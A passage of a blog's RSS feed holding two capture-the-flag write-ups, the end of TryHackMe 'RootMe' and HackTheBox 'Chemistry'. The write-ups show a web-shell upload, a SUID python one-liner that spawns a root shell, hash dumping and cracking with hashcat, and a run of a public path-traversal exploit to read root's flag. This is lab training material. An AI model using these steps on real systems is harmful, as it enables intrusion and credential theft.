+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;navigate to the route where your file is uploaded, for example: /uploads/shell.php5
+and you got the shell&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/8.png"
+width="542"
+height="188"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_265562d5df2d7729.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_c839516de95e6fca.png 1024w"
+loading="lazy"
+alt="Image 8"
+class="gallery-image"
+data-flex-grow="288"
+data-flex-basis="691px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Once obtained the shell, let&amp;rsquo;s find the flag and get it!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find / -name user.txt 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat /var/www/user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="root-flag"&gt;Root Flag
+&lt;/h3&gt;&lt;p&gt;Find binaries with SUID permissions that allow users to execute the binary with the permissions of the owner of the file, rather than the user who runs the command (most of the times is root).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find / -perm -4000 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And look at that, python? Let&amp;rsquo;s check what user is the owner of the binary&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -la /usr/bin/python
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rwsr-sr-x 1 root root 3665768 Aug 4 2020 /usr/bin/python
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Sweet! it&amp;rsquo;s root. You can use gtfobins to look for info about a binary you can possibly use to escalate privileges:
+&lt;a class="link" href="https://gtfobins.github.io/gtfobins/python/" target="_blank" rel="noopener"
+&gt;https://gtfobins.github.io/gtfobins/python/&lt;/a&gt;
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/10.png"
+width="833"
+height="247"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_67200d7dbc8eec37.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_542ba0758df375d6.png 1024w"
+loading="lazy"
+alt="Image 9"
+class="gallery-image"
+data-flex-grow="337"
+data-flex-basis="809px"
+&gt;
+we can execute a oneliner to spawn a shell as root and obtain the final flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/python -c &lt;span class="s1"&gt;&amp;#39;import os; os.execl(&amp;#34;/bin/sh&amp;#34;,&amp;#34;sh&amp;#34;,&amp;#34;-p&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/9.png"
+width="514"
+height="74"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_dd7f58f0fc440341.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_9c49c8e7a0df4b64.png 1024w"
+loading="lazy"
+alt="Image 10"
+class="gallery-image"
+data-flex-grow="694"
+data-flex-basis="1667px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat /root/root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;and you got the root flag!!&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;This machine covers topics like Arbitrary File Uploads and exploiting binaries with SUID permissions to escalate privileges.&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;Hope you enjoyed it and Happy Hacking!&lt;/mark&gt;&lt;/p&gt;</description></item><item><title>HTB Chemistry - Writeup</title><link>https://solarspectre.github.io/p/htb-chemistry-writeup/</link><pubDate>Thu, 20 Feb 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-chemistry-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/cover.png" alt="Featured image of post HTB Chemistry - Writeup" /&gt;&lt;p&gt;Let&amp;rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rustscan --top -a &amp;lt;victim_ip&amp;gt; &lt;span class="p"&gt;|&lt;/span&gt; tee initialScan.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/1.png"
+width="797"
+height="615"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/1_hu_57bd9480770c7579.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/1_hu_155c8e7454c49020.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="311px"
+&gt;
+once it&amp;rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/2.png"
+width="736"
+height="362"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/2_hu_676310d6f9b6d8df.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/2_hu_d717babb291fc7de.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="203"
+data-flex-basis="487px"
+&gt;
+Now, the scan shows that the machine is hosting a web server with Python, we can take a look at the website to investigate more using burpsuite as a proxy to intercept all the traffic.
+Register an account and login to it.&lt;/p&gt;
+&lt;h3 id="user-flag"&gt;User Flag
+&lt;/h3&gt;&lt;p&gt;There&amp;rsquo;s an Arbitrary code execution vulnerability in the dashboard, allowing us to upload a maliciously crafted cfi file that we can use to upload and execute a reverse shell
+&lt;a class="link" href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f" target="_blank" rel="noopener"
+&gt;https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f&lt;/a&gt;
+Just upload it and view it to execute the reverse shell&lt;/p&gt;
+&lt;p&gt;Once obtained the shell, let&amp;rsquo;s enumerate the contents in the directory
+&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/3.png"
+width="451"
+height="89"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/3_hu_ac257078e4b5d7ad.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/3_hu_c6e85f7cfa51a7c5.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="506"
+data-flex-basis="1216px"
+&gt;&lt;/p&gt;
+&lt;p&gt;There&amp;rsquo;s a users table where they store the credentials&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlite3 database.db &lt;span class="s1"&gt;&amp;#39;select * from user;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/4.png"
+width="544"
+height="326"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/4_hu_6795b5d12c6eae49.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/4_hu_49c92ef2b740dbec.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="166"
+data-flex-basis="400px"
+&gt;&lt;/p&gt;
+&lt;p&gt;You can crack it with hashcat&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;hashcat -m &lt;span class="m"&gt;0&lt;/span&gt; creds.txt rockyou.txt --user
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;You can try the credentials you obtained to login to the dashboard, maybe they used the same credentials to login to ssh&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/5.png"
+width="452"
+height="72"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/5_hu_414c292065e10b97.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/5_hu_e87de07bdd1c06e0.png 1024w"
+loading="lazy"
+alt="Image 5"
+class="gallery-image"
+data-flex-grow="627"
+data-flex-basis="1506px"
+&gt;&lt;/p&gt;
+&lt;p&gt;rosa&amp;hellip; why?
+anyways, here&amp;rsquo;s your user flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="root-flag"&gt;Root Flag
+&lt;/h3&gt;&lt;p&gt;Find other ports that the host is using but aren&amp;rsquo;t public&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;netstat -tuln
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/6.png"
+width="605"
+height="179"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/6_hu_194f95f62c8cbeb4.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/6_hu_72dfd5d65b7e667e.png 1024w"
+loading="lazy"
+alt="Image 6"
+class="gallery-image"
+data-flex-grow="337"
+data-flex-basis="811px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Using port forward, we can see the contents of that page&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ssh -L 5555:localhost:8080 rosa@10.10.11.38
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/9.png"
+width="1185"
+height="562"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/9_hu_6ffb099e42e9af03.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/9_hu_fff8a48ba18fa328.png 1024w"
+loading="lazy"
+alt="Image 7"
+class="gallery-image"
+data-flex-grow="210"
+data-flex-basis="506px"
+&gt;&lt;/p&gt;
+&lt;p&gt;we can also use whatweb to see the technologies that the page uses&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;whatweb http://localhost:5555
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/8.png"
+width="856"
+height="35"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/8_hu_9b6ca95ab9731b99.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/8_hu_aaa1b6a0e5c9e701.png 1024w"
+loading="lazy"
+alt="Image 8"
+class="gallery-image"
+data-flex-grow="2445"
+data-flex-basis="5869px"
+&gt;&lt;/p&gt;
+&lt;p&gt;look for directories with gobuster&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/7.png"
+width="520"
+height="261"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/7_hu_9515a105f408ed59.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/7_hu_96b7ec983c9c26d5.png 1024w"
+loading="lazy"
+alt="Image 9"
+class="gallery-image"
+data-flex-grow="199"
+data-flex-basis="478px"
+&gt;&lt;/p&gt;
+&lt;p&gt;looking for vulnerabilities of the website technologies you can find the CVE-2024-23334
+for the &lt;strong&gt;Aiohttp&lt;/strong&gt; version that the website is using, here&amp;rsquo;s a python script that exploits it:
+&lt;a class="link" href="https://github.com/wizarddos/CVE-2024-23334" target="_blank" rel="noopener"
+&gt;https://github.com/wizarddos/CVE-2024-23334&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python exploit.py -u &lt;span class="s2"&gt;&amp;#34;http://localhost:5555&amp;#34;&lt;/span&gt; -f &lt;span class="s2"&gt;&amp;#34;/root/root.txt&amp;#34;&lt;/span&gt; -d &lt;span class="s2"&gt;&amp;#34;/assets&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/10.png"
+width="479"
+height="250"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/10_hu_121c06fa7e010e4c.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/10_hu_ccb4b7b2f0a9c65d.png 1024w"
+loading="lazy"
+alt="Image 10"
+class="gallery-image"
+data-flex-grow="191"
+data-flex-basis="459px"
+&gt;&lt;/p&gt;
+&lt;p&gt;and you got the root flag!!&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;This machine covers topics like LFI, port forwarding, looking for CVEs and password cracking.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/11.png"
+width="731"
+height="590"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/11_hu_eb47687b88408f93.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/11_hu_8683d605435bf6bc.png 1024w"
+loading="lazy"
+alt="Final"
+class="gallery-image"
+data-flex-grow="123"
+data-flex-basis="297px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;Hope you enjoy it and Happy Hacking!&lt;/mark&gt;&lt;/p&gt;</description></item></channel></rss>
